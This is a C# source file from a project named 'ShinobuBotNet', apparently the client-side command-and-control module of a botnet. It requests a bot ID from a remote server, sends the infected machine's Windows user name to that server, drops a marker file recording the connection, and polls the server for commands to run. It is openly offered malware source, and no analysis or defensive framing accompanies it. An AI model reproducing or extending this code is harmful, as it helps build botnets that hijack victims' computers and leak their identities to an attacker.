using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;

namespace ShinobuBotNet
{
    class API
    {
        public static string Get_ID()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string id = wc.DownloadString(configs.server + "GetID.php");
            return id;
        }

        public static void connect()
        {
            WebClient wc = new WebClient();
            wc.Proxy = null;
            string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

            string result = wc.DownloadString(configs.server + "connect.php?user=" + userName);
        }

        public static string cheak_connect()
        {
            if (System.IO.File.Exists("c0n0ct.ch"))
            {
                return "yes";
            }

            else
            {
                return "no";
            }
        }

        public static void creat_cheak_File()
        {
            System.IO.File.Create("c0n0ct.ch");
        }

        public static string GetCommand(string id)
        {
            string html = web.GetHTML(configs.server + "getcommand.php?id=" + id);
            cmd command = new cmd(html);
            if (command.ComType == null)
            {
                return "null";
            }
            else
            {
                return html;
            }
        }
    }
}
